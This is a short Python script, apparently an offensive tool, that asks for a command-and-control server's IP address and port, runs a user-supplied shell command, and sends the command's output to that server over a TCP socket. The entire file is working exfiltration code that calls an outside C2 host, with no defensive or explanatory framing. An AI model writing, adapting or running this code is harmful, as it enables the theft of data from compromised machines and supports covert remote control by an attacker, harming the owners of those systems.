#!/usr/bin/python3

# Standard libraries only
import socket
import subprocess

# Initialize remote host variables with user input
RHOST = str(input("C2 IP Address\n" ))
RPORT = int(input("C2 Port\n"))
RSERVER = (RHOST, RPORT)

# Run command
CMD = input("What is your command\n")
CMDARG = str(CMD).split(" ")
execute = subprocess.run(CMDARG, capture_output=True, text=True)
DATA = str(execute.stdout)

# Connect out
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(RSERVER)
s.sendall(bytes(DATA,"utf-8"))